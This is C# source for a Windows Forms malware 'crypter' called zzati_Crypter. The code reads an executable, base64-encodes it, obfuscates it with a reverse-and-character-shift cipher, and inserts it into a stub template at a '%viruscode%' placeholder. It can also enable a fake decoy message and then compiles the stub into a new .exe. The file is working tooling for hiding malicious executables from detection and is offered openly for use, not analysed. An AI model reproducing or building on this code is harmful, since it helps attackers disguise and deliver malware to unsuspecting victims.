using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace zzati_Crypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        //UNSAFE CODE


       

        private void button1_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {


                // SELECT OUR FILE :
                openFileDialog.Filter = "exe (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {


                    // DISPLAY OUR FILE ON TEXTBOX1, SO WE CAN READ OUR FILE LATER.

                    textBox1.Text = openFileDialog.FileName;


                    // READ AND CONVERT OUR FILE TO BASE64 STRING :

                    string ey = Convert.ToBase64String(File.ReadAllBytes(textBox1.Text));

                    // AND FINALLY DISPLAYING OUR BASE64 STRING INTO Richtextbox1, THEN Encrypting The Code Inside The RichTextBox1

                    string iamrichtextbox1 = richTextBox1.Text = pr0t3_encrypt(ey);



                    // AND DISPLAYING ENCRYPTED BASE64 CODE INTO RichTextBox2


                    richTextBox2.Text = iamrichtextbox1;



                }
                else
                {


                }


               
            }


        }


        // OUR ENCRYPTION TO ENCRYPT BASE64 CODE :

        public static string pr0t3_encrypt(string message)
        {
            int num = 3;
            message = Strings.StrReverse(message);
            string text = message;
            int i = 0;
            int length = text.Length;
            checked
            {
                string text2 = "";
                while (i < length)
                {
                    char @string = text[i];
                    text2 += Conversions.ToString(Strings.Chr(Strings.Asc(@string) + num));
                    i++;
                }
                return text2;
            }
        }




        private void button2_Click(object sender, EventArgs e)
        {



            // DECLARE OUR STUB FROM RESOURCES :
            string ourstub = Properties.Resources.stub;

            // DISPLAYING OUR STUB CODE INTO RICHTEXTBOX3 : 

            richTextBox3.Text = ourstub;

            // SEARCHING %Viruscode% inside the stub and replacing it with RichTextBox2.Text <= which contains encrypted Prot3 Code

            richTextBox3.Text = richTextBox3.Text.Replace("%viruscode%", richTextBox2.Text);


            // ENABLING FAKE MESSAGE FEATURE : 

            if (checkBox1.Checked == true)
            {


                richTextBox3.Text = richTextBox3.Text.Replace("//ourfakemessage", "");
                richTextBox3.Text = richTextBox3.Text.Replace("%fakemssage%", textBox2.Text);



            }





            // AND FINALLY WE USE SAVEFILEDIALOG/COMPILER TO SAVE OUR EXE

            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Filter = "Executable (*.exe)|*.exe";
                if (saveFile.ShowDialog() == DialogResult.OK)
                {

                    //CALLING CODEDOM TO BUILD OUR STUB :
                    new laurentbd.bd(richTextBox3.Text, saveFile.FileName);

                    // SHOWS MESSAGE AFTER COMPILE:
                    MessageBox.Show("Your File Has Been Saved To" + saveFile.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

             

            }



        }
    }
}


